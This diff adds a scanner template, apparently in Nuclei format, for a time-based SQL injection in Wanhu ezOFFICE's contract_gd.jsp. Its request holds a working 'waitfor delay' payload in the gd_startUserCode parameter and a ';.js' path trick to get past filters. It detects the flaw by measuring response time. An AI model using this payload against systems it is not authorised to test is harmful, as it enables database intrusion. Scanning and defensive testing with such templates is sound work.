@@ -1,0 +1,27 @@
+id: poc-yaml-wanhu-ezoffice-contract-gd-jsp-sqli
+info:
+  name: 万户 ezOFFICE contract_gd.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1)+2}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A{{t1}}%27--'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration > to_number(t1) && duration < to_number(t2)'
